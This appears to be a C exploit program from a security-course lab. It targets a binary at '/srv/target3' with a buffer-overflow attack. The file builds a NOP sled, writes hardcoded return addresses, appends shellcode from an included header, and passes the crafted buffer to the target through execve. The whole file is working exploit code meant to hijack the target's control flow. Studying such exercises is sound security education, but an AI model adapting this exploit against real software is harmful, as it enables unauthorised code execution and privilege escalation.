#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target3";
const int BUFFER_SIZE = 400;
const uint32_t BASE_ADDRESS = 0xffffdec0;
const int NOP_SIZE = 201;
const char NOP = 0x90;
const int OFFSET = 4;

void prepare_buffer(char* buffer) {
    memset(buffer, NOP, BUFFER_SIZE); 
    *(uint32_t*)(buffer) = BASE_ADDRESS + OFFSET; 
    *(uint32_t*)(buffer + OFFSET) = BASE_ADDRESS + 2 * OFFSET; 
    memcpy(buffer + NOP_SIZE, shellcode, sizeof(shellcode)); 
    buffer[BUFFER_SIZE - 1] = '\0';
}

int main(void) {
    char env[BUFFER_SIZE];
    prepare_buffer(env);

    char* args[] = {(char*)TARGET, env, NULL};
    char* envp[] = {NULL};

    if (execve(TARGET, args, envp) == -1) {
        perror("execve failed");
    }

    return 0;
}
